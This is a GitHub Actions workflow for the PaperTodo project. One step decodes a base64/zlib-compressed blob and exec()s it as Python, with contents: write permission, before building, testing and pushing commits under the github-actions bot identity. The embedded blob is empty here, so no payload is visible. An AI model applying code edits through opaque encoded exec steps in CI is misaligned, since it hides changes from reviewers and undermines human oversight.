name: PR 286 presentation implementation check
on:
  push:
    branches: [feat/codex-skills-mcp-20260918]
    paths: [.github/workflows/presentation-286.yml]
permissions:
  contents: write
concurrency:
  group: pr286-presentation-implementation
  cancel-in-progress: false
jobs:
  apply-and-check:
    if: github.repository == 'snownico0722/PaperTodo'
    runs-on: windows-latest
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.sha }}
          fetch-depth: 1
          submodules: recursive
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '10.0.x'
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - name: Apply reviewed presentation changes
        shell: python
        run: |
          import base64, zlib, hashlib
          code = zlib.decompress(base64.b64decode("""
          
          
          
          """))
          assert hashlib.sha256(code).hexdigest() == 'a81b58943e74cdffacec9d25d225e74f373ee44cd6f92667f8cdb3c8a9b9b6bb'
          exec(compile(code, 'presentation-286-edit', 'exec'))
      - name: Build PaperTodo
        shell: pwsh
        run: dotnet build ./PaperTodo.csproj -c Release
      - name: Run settings and cross-paper presentation behavior checks
        shell: pwsh
        run: dotnet run --project ./tests/PaperTodo.SettingsApiChecks/PaperTodo.SettingsApiChecks.csproj -c Release
      - name: Run protocol policy checks
        shell: pwsh
        run: dotnet run --project ./tests/PaperTodo.ProtocolPolicyChecks/PaperTodo.ProtocolPolicyChecks.csproj -c Release
      - name: Run menu image popup checks
        shell: pwsh
        run: dotnet run --project ./tests/PaperTodo.PluginApiChecks/PaperTodo.PluginApiChecks.csproj -c Release
      - name: Run Codex checks
        shell: pwsh
        run: dotnet run --project ./tests/PaperTodo.CodexCliBridgeChecks/PaperTodo.CodexCliBridgeChecks.csproj -c Release
      - name: Run real window-stack regressions
        shell: pwsh
        run: dotnet run --project ./tests/PaperTodo.WindowStackChecks/PaperTodo.WindowStackChecks.csproj -c Release
      - name: Rebuild native plugin outputs
        shell: pwsh
        run: |
          foreach ($project in (Get-ChildItem plugin-samples -Recurse -Filter *.csproj | Sort-Object FullName)) {
            & ./plugin-samples/Build-And-Install-NativePlugin.ps1 -ProjectPath $project.FullName
            if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          }
      - name: Commit verified implementation to the existing PR branch
        shell: pwsh
        run: |
          git diff --check
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add -- src PaperTodo.Plugin.Abstractions plugin-samples plugins doc tests CHANGELOG.md CHANGELOG.zh.md
          git diff --cached --stat
          git commit -m '插件与 MCP：补齐跨纸片显示控制和行为回归'
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          git push origin HEAD:refs/heads/feat/codex-skills-mcp-20260918
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          git log -1 --format='%H %s'
